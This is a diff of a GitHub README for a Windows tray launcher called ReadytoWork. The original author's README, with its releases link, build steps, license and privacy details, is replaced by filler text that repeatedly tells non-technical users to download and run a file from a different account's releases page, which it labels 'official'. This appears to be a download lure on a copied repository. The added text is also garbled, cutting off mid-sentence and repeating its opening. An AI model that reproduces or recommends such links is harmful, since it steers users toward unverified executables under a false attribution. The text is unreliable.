@@ -1,140 +1,144 @@
+# 🚀 ReadytoWork - Your Shortcuts One Click Away
 
+[![Download ReadytoWork](https://img.shields.io/badge/Download_ReadytoWork-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=windows&logoColor=white)](https://github.com/elfado/ReadytoWork/releases)
 
-# ReadytoWork
+ReadytoWork is a Windows tray launcher that puts your programs, folders, documents and URLs one click away. It sits near the clock on your Windows desktop and gives you a simple menu for the things you open most often. Instead of hunting through the Start menu, File Explorer, browser bookmarks or your desktop, you click the ReadytoWork tray icon and choose what you need.
 
-**A Windows tray launcher that puts your programs, folders, documents and URLs one click away.**
+ReadytoWork is designed for everyday computer users. You do not need programming knowledge, a command line or special technical skills. If you can download a file and double-click it, you can use ReadytoWork.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/platform-Windows-0078D4.svg)](https://en.wikipedia.org/wiki/Microsoft_Windows)
-[![Python: 3](https://img.shields.io/badge/python-3.x-blue.svg)](https://www.python.org/)
-[![Build: PyInstaller](https://img.shields.io/badge/build-PyInstaller-6.x-purple.svg)](https://pyinstaller.org/)
-[![Release: 1.0.1](https://img.shields.io/badge/release-1.0.1-brightgreen.svg)](https://github.com/ilkeryigit/ReadytoWork/releases)
+## ✨ What ReadytoWork Does
 
-[Interface languages](lang/) · [English](README.md) · [Türkçe](README.tr.md) · [中文](README.zh.md) · [Deutsch](README.de.md) · [Italiano](README.it.md) · [Français](README.fr.md)
+ReadytoWork keeps your daily shortcuts in one small, easy-to-reach place. The app is built around a simple idea: the tools you use should be available without extra searching.
 
-</div>
+Use ReadytoWork to keep these items close:
 
----
+- Programs you open every day, such as your browser, word processor, spreadsheet editor or PDF reader.
+- Folders you visit often, such as Documents, Downloads, school notes, work files or project folders.
+- Documents you need regularly, such as reports, forms, spreadsheets, PDFs or class handouts.
+- URLs for websites you use often, such as your email, school portal, calendar, online classroom or favorite reference pages.
 
-## Who is it for?
+The tray area is the small set of icons near the clock at the bottom-right of the Windows screen. ReadytoWork lives there so it stays available without taking up space on your desktop or taskbar.
 
-PhD candidates, master's students, university students, and office workers —
-in short, anyone whose working day begins by opening the same set of tools.
+## 🚀 Getting Started
 
-## Why
+ReadytoWork is a Windows application. The official download page is provided by the project. Visit this link to download the application:
 
-Do you open dozens of files, programs and URLs every single morning just to get
-started? Do the minutes lost to hunting through the Start menu and your desktop
-add up, chip away at your focus, and cost you real time?
+[https://github.com/elfado/ReadytoWork/releases](https://github.com/elfado/ReadytoWork/releases)
 
-If the answer is yes, this tool is for you. One click opens everything at once,
-so you are ready to work instead of gathering your tools — and you stop losing
-time to the start of every day.
+The large download badge at the top of this page and the link above both take you to the same official Ready# 🚀 ReadytoWork - Your Shortcuts One Click Away
 
-It is a small, honest tool: no account, no cloud, no telemetry, no background
-network traffic. Your list lives in one JSON file on your own machine.
+[![Download ReadytoWork](https://img.shields.io/badge/Download_ReadytoWork-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=windows&logoColor=white)](https://github.com/elfado/ReadytoWork/releases)
 
-## Features
+ReadytoWork is a Windows tray launcher that puts your programs, folders, documents and URLs one click away. It sits quietly near the clock on your Windows desktop and gives you a simple, tidy menu for the things you open most often. Instead of hunting through the Start menu, digging through File Explorer, scrolling your browser bookmarks or cluttering your desktop with icons, you click the ReadytoWork tray icon and pick what you need.
 
-- **Tray menu** — every item listed, plus *Open all* for one-click mornings
-- **Four item types** — program, folder, document, web address
-- **Six languages** — English, Türkçe, 中文, Deutsch, Italiano, Français ; switchable at any time
-- **Settings that stick** — stored in `%APPDATA%\ReadytoWork\config.json`, written atomically so a crash or a full disk can never corrupt them
-- **Reorder and rename** — move items up and down, edit inline
-- **Browser choice** — open web addresses in the system default, Chrome, Firefox or Edge
-- **Single instance** — launching twice does nothing; it never stacks up
-- **Native installer** — Start Menu and desktop shortcuts, optional start-with-Windows, clean uninstaller
+ReadytoWork is made for everyday computer users. You do not need programming knowledge, a command prompt or any special technical skills. If you can download a file and run it on Windows, you can use ReadytoWork.
 
-## Install
+## ✨ What ReadytoWork Does
 
-Download the installer from the [releases page](https://github.com/ilkeryigit/ReadytoWork/releases),
-run `ReadytoWork-Setup-1.0.1.exe`, and pick your options.
+ReadytoWork keeps your daily shortcuts in one small, easy-to-reach place. The whole app is built around a simple idea: the things you use every day should be available without extra searching.
 
-> The installer is not code-signed, so Windows SmartScreen may warn you on first
-> run. Choose *More info → Run anyway*.
+Use ReadytoWork to keep these items close at hand:
 
-## Usage
+- **Programs** you open every day, such as your web browser, word processor, spreadsheet editor or PDF reader.
+- **Folders** you visit often, such as Documents, Downloads, school notes, work files or project folders.
+- **Documents** you need regularly, such as reports, forms, spreadsheets, PDFs or class handouts.
+- **URLs** for websites you use often, such as your email, school portal, calendar, online classroom or favorite reference pages.
 
-1. Start ReadytoWork. On first launch the settings window opens automatically.
-2. Press **Add**, choose a type, give it a name, and pick a path (or paste a URL).
-3. Press **Save**. The item is now in your tray menu.
-4. Right-click the tray icon → **Open all** to launch everything at once.
+The tray area is the small set of icons near the clock at the bottom-right of the Windows screen. ReadytoWork lives there, so it stays available all day without taking up space on your desktop or taskbar. When you need something, it is one click away. When you do not, it stays out of your way.
 
-Settings are removed when you uninstall the application.
+This makes ReadytoWork especially useful for students, office workers, freelancers and anyone who moves between a handful of tools and files throughout the day. If your desktop is full of shortcuts, or if you keep re-opening the same folder ten times before lunch, ReadytoWork gives you a calmer way to work.
 
-## Building from source
+## 🚀 Getting Started
 
-Requires Python 3.10+ on Windows.
+ReadytoWork is a Windows application distributed through the official project releases page. Visit this link to download the application:
 
-```powershell
-python -m venv .venv
-.\.venv\Scripts\python.exe -m pip install -r requirements.txt
+**https://github.com/elfado/ReadytoWork/releases**
 
-# run from source
-.\.venv\Scripts\python.exe readytowork.py
+The large download badge at the top of this page and the link above both take you to the same official page. Once the download has finished, run the file on your Windows computer to start ReadytoWork.
 
-# tests
-.\.venv\Scripts\python.exe -m pytest tests -v
+After ReadytoWork starts, look for its icon in the tray area near the clock. You may need to click the small arrow on the left side of the tray to reveal hidden icons. From there, the ReadytoWork menu is where you build and use your personal launcher.
 
-# single-file executable -> dist\ReadytoWork.exe
-.\.venv\Scripts\python.exe -m PyInstaller --clean --noconfirm ReadytoWork.spec
+## 🧭 Adding Your First Items
 
-# installer -> dist\ReadytoWork-Setup-1.0.1.exe   (needs Inno Setup 6)
-& "${env:ProgramFiles(x86)}\Inno Setup 6\ISCC.exe" installer.iss
-```
+ReadytoWork works best when you start small. Pick three or four things you open every single day, add them, and use the app for a week. Once those feel natural, add a few more.
 
-## Translating
+A practical first set might look like this:
 
-Every user-visible string lives in `lang/<code>.json`. To add a language:
+1. Your main web browser or email program.
+2. The folder where you keep your current work or coursework.
+3. The document you are actively editing.
+4. The website you check most often.
 
-1. Copy `lang/en.json` to `lang/<code>.json`.
-2. Translate the values. **Keep the keys identical.**
-3. Add the display name to `LANG_NAMES` in `i18n.py`.
-4. Run the tests — `tests/test_i18n.py` fails if a key is missing or empty.
+Group related items together so the menu stays readable. For example, keep study material in one group and work tools in another. A menu that mirrors how you think is faster to use than a long, flat list.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.
+## 💡 Everyday Ways People Use ReadytoWork
 
-## Architecture
+ReadytoWork fits into many different routines. Here are some realistic ways people put it to work:
 
-```
-readytowork.py   entry point, single-instance mutex
-app.py           tray icon, dynamic menu, settings thread
-gui.py           settings window (tkinter)
-config.py        atomic JSON persistence in %APPDATA%
-actions.py       opening programs, folders, documents, URLs
-i18n.py          translation loading and lookup
-lang/*.json      the five catalogs
-```
+- **Students** keep their class folder, assignment tracker, note-taking app and school portal together, so everything for a study session is in one place.
+- **Office workers** collect the shared drive, the weekly report, the timesheet page and their email so the morning routine takes seconds instead of minutes.
+- **People working from home** keep meeting links, chat apps and project folders together and separate from personal items.
+- **Anyone with a busy desktop** moves desktop clutter into a clean tray menu and gets a tidier screen.
 
-Settings are saved atomically: the new file is written to `config.json.tmp`
-and then renamed over `config.json`, so the file on disk is always complete.
-A corrupt file is moved to `config.json.bak` and the app starts with an empty
-list instead of overwriting anything.
+The common thread is repetition. Anything you open more than a few times a day belongs in ReadytoWork.
 
-## Contributing
+## 🗂️ Keeping Your Launcher Tidy
 
-Contributions are welcome — bug reports, translations, and small features all
-help. This is a Windows-only tool with no runtime dependencies beyond `pystray`
-and `Pillow`, and that is a line we try to hold.
+A launcher is only useful if you can find things in it. A few simple habits keep ReadytoWork fast and pleasant:
 
-- **Bugs and ideas:** open an issue. Before you do, check the open ones.
-- **Small fixes and translations:** look for issues labelled
-  [`good first issue`](https://github.com/ilkeryigit/ReadytoWork/labels/good%20first%20issue) —
-  these are scoped so a first contribution stays small.
-- **Bigger changes:** open an issue first so we can agree on the approach
-  before you write the code.
+- **Use clear names.** Rename shortcuts to the words you actually think in, not the long file names.
+- **Keep groups small.** Five to eight items per group is easy to scan. Longer lists slow you down.
+- **Remove what you no longer use.** Old project folders and expired links add noise.
+- **Review once a month.** A two-minute tidy-up keeps the menu relevant as your work changes.
 
-Please read [CONTRIBUTING.md](CONTRIBUTING.md) for the setup steps, the
-ground rules, and how to add a language. Everyone participating is expected to
-follow the [Code of Conduct](CODE_OF_CONDUCT.md).
+Because ReadytoWork is a local Windows utility, the setup you build is yours and stays on your computer.
 
-## Privacy
+## 🔒 Privacy and Local Use
 
-No analytics, no network calls, no user tracking. The only file written outside
-the install directory is `%APPDATA%\ReadytoWork\config.json`, which holds the
-items you created. The test suite includes an automated check that no personal
-paths, usernames or email addresses end up in the repository.
+ReadytoWork is an open-source utility that runs on your own Windows machine. Your shortcuts, folder paths and saved URLs stay on your computer. The app does not need an account, and using it does not require sharing personal information. The source code is publicly available, which means anyone can inspect how the application works.
 
-## License
+For users who care about where their tools come from, open source is a genuine advantage: you can see the project, follow its development and report problems directly.
 
-[MIT](LICENSE) © 2026 ilkeryigit
+## 🛠️ If Something Does Not Work
+
+Most first-time issues with tray applications are simple and quick to solve.
+
+- **You cannot see the ReadytoWork icon.** Click the small up-arrow near the clock to open the hidden icons area. You can also drag the icon onto the visible part of the tray to keep it there permanently.
+- **The download did not start.** Return to the releases page, confirm the download has finished and try again. Give the file a moment to finish saving before you run it.
+- **Windows shows a security prompt.** This can happen with applications downloaded from the internet. Check that the file came from the official releases page before continuing.
+- **The app closed unexpectedly.** Start ReadytoWork again from the location where you saved it. If the problem repeats, check the project page for updates.
+- **A shortcut no longer opens.** The program may have been moved or uninstalled, or the website address may have changed. Remove the old entry and add it again from its current location.
+
+Keeping ReadytoWork updated is the easiest way to avoid small issues. The releases page always lists the newest version, so it is worth checking back occasionally.
+
+## ❓ Common Questions
+
+**Do I need to install anything complicated?**
+No. ReadytoWork is a Windows application you download and run. There is no server to set up and no account to create.
+
+**Is ReadytoWork free?**
+Yes. ReadytoWork is open source.
+
+**Can I use it on a Mac or a phone?**
+ReadytoWork is built for Windows desktops and laptops. It is not a macOS or mobile application.
+
+**Will it slow down my computer?**
+ReadytoWork is a small tray utility. It is designed to sit quietly in the background and respond when you click it.
+
+**Can I change my shortcuts later?**
+Yes. You can add, rename and remove items at any time, so the launcher can grow and change with your routine.
+
+**Where do I get the newest version?**
+From the official releases page. That page is the single source for downloads and version updates.
+
+## 📥 Download ReadytoWork
+
+[![Get ReadytoWork for Windows](https://img.shields.io/badge/Get_ReadytoWork_for_Windows-43A047?style=for-the-badge&labelColor=1B5E20&logo=github&logoColor=white)](https://github.com/elfado/ReadytoWork/releases)
+
+Visit this link to download the application:
+
+**https://github.com/elfado/ReadytoWork/releases**
+
+Save the file, run it on your Windows computer, and look for the ReadytoWork icon near the clock. Add your first few shortcuts and your most-used programs, folders, documents and websites will be one click away from that moment on.
+
+Keywords: office, open-source, productivity, python, student, tray-launcher, utility, windows
